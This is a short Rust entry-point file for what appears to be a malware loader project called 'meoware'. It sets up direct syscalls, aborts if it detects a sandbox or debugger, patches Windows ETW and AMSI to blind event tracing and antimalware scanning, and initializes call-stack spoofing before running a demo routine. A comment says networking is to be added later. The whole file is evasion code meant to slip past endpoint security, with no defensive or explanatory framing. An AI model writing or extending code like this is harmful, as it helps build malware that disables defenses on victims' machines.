#![cfg_attr(not(any(debug_assertions, feature = "verbose")), no_std)]

use meoware::core::{amsi, anti_debug, etw, sandbox, spoof, ssn_table};
use meoware::debug;

fn main() {
    unsafe {
        if !ssn_table::initialize_syscalls(core::ptr::null_mut()) {
            return;
        }
        
        if !sandbox::is_real_environment() {
            debug!("[SANDBOX] Environment check failed — aborting");
            return
        } 

        if !anti_debug::is_safe_environment() {
            debug!("[ANIT] Environment check failed - aborting");
            return;
        }

        etw::patch_etw();
        amsi::patch_amsi();  
        spoof::initialize_spoof_gadgets();

        // Skiping the networking for now, Ill do migration first

        meoware::core::demo::demo();
    }
}
